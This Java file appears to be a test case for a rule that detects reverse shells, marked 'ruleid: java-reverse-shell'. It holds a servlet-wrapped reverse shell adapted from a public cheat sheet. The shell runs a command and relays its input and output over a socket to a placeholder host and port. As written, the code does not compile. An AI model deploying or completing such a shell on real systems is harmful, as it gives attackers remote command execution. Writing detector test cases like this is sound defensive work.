// Example shell from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java-alternative-1
// ruleid: java-reverse-shell
package servlets;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.commons.io.FilenameUtils;

class PrcJRS extends HttpServlet
{
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
  Socket s=new Socket(host,port);
  InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
  OutputStream po=p.getOutputStream(),so=s.getOutputStream();
  public static void main(String[] args) throws Exception {
   while(!s.isClosed()){
	while(pi.available()>0)
		so.write(pi.read());
	while(pe.available()>0)
		so.write(pe.read());
	while(si.available()>0) 
		po.write(si.read());
	so.flush();
	po.flush();
	Thread.sleep(50);
   }
   try {
		p.exitValue();
		break;
   } catch (Exception e){
		p.destroy();
		s.close();
   }
  }
}